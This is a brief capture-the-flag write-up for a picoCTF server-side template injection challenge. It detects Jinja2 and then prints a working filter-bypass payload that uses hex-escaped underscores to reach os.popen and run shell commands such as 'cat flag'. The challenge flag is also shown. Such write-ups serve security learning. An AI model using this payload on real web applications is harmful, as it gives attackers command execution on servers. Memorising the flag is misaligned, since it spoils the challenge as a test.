# URL
https://play.picoctf.org/practice/challenge/488?page=1&search=sst
# Challenge
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)
Additional details will be available after launching your challenge instance.

# Method of Solving
* I know the website runs jinja2 since the input {{7*'7'}} yields 7777777
* With this knowledge, I searched up SSTI Jinja injections, which led me to this website https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
* On the website lies a payload we can test: {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
* This payload returns the UID, which is root, so the website's way of bypassing the WAF worked!
* All I had to do was change the value "id" into "cat flag", which resulted in the flag being printed on the website!
* picoCTF{sst1_f1lt3r_byp4ss_7c3c6e7f}
